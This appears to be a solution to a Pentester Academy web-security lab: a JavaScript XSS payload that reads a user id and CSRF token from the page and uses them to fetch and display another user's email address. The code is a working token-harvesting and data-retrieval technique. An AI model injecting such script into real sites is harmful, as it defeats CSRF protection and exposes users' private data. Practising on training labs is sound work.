// https://pentesteracademylab.appspot.com/lab/webapp/jfp/17

// Objectives:
//     Find John's Email Address using an XSS vulnerability on this page
//     Display the Email address in the div with id "result"
//     No Hardcoded values can be used - everything has to be figured out dynamically


let uid = document.getElementById('uid').textContent.split(':')[1];
let token = document.getElementById('csrf').textContent.split(':')[1];

const http = new XMLHttpRequest();
const url = '/lab/webapp/jfp/17/email?uid=' + uid + '&csrf_token=' + token;
http.open('GET', url);
http.send();

http.onreadystatechange = function (){
    if (this.readyState == 4 && this.status == 200){
        let div = document.getElementById('result');
        let h4 = document.createElement('h4');
        h4.textContent = http.responseText;
        div.appendChild(h4);
    }
}
